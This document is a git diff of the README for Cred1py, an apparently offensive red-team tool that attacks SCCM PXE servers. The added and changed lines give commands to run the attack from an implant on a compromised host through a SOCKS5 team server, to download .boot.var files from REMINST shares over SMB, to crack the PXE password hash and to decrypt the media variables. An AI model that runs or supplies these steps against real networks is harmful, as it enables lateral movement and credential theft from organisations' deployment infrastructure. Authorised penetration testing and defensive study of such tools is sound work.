@@ -26,12 +26,24 @@ Then we can invoke Cred1py with:
 python ./main.py <target> <src_ip> <socks_host> <socks_port>
 ```
 
+Or using the explicit `attack` subcommand:
+
+```
+python ./main.py attack <target> <src_ip> <socks_host> <socks_port>
+```
+
 Where:
 
 * Target - The SCCM PXE server IP
 * SRC_IP - The IP address of the compromised server we are running the implant on
 * SOCKS_HOST - The IP of the team server running SOCKS5
 * SOCKS_PORT - The SOCKS5 port
+
+To decrypt a previously downloaded `.boot.var` file with a known key:
+
+```
+python ./main.py decrypt <path_to_boot_var_file> <key_hex>
+```
 
 To help visualise the components referenced in the arguments:
 
@@ -88,7 +100,7 @@ If the TFTP download fails (common over SOCKS5), Cred1Py will still output the d
 
 ```
 download \\sccmserver.lab.local\REMINST\SMSTemp\BootFileName.boot.var
-python3 pxethiefy.py decrypt -p <derived_key_hex> -f /tmp/BootFileName.boot.var
+python3 main.py decrypt /tmp/BootFileName.boot.var <derived_key_hex>
 ```
 
 ### PXE password is set (no crypto key in DHCP response)
@@ -96,14 +108,14 @@ python3 pxethiefy.py decrypt -p <derived_key_hex> -f /tmp/BootFileName.boot.var
 When a PXE password is configured, the DHCP response does NOT include crypto key material. Cred1Py extracts a hashcat hash from the variables file header. Crack it, then re-run with the `-p` flag:
 
 ```
-python ./main.py <target> <src_ip> <socks_host> <socks_port> -p <cracked_password_hex>
+python ./main.py attack <target> <src_ip> <socks_host> <socks_port> -p <cracked_password_hex>
 ```
 
-If TFTP fails, download the file via SMB and use pxethiefy.py to decrypt:
+If TFTP fails, download the file via SMB and decrypt locally:
 
 ```
 download \\sccmserver.lab.local\REMINST\SMSTemp\BootFileName.boot.var
-python3 pxethiefy.py decrypt -p <cracked_password_hex> -f /tmp/BootFileName.boot.var
+python3 main.py decrypt /tmp/BootFileName.boot.var <cracked_password_hex>
 ```
 
 ## Credits
